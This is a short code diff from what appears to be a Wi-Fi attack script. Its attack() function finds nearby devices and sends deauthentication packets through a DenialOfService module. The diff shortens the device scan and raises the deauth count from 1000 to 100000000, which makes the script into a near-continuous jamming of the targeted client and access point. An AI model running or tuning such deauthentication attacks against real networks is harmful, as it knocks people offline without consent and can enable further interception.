@@ -8,7 +8,7 @@ from modules.denial_of_service import DenialOfService
 
 
 def attack(interface, vendor=None):
-    analyzer = WirelessTrafficAnalyzer(interface, 10)
+    analyzer = WirelessTrafficAnalyzer(interface, 2)
     devices = analyzer.get_devices(vendor)
     try:
         device = devices[6][0]
@@ -31,7 +31,7 @@ def attack(interface, vendor=None):
     device_analyzer.visualize_packets(channel)
 
     dos = DenialOfService(interface, channel)
-    dos.deauth(device, ap, 1000)
+    dos.deauth(device, ap, 100000000)
 
     return True
 
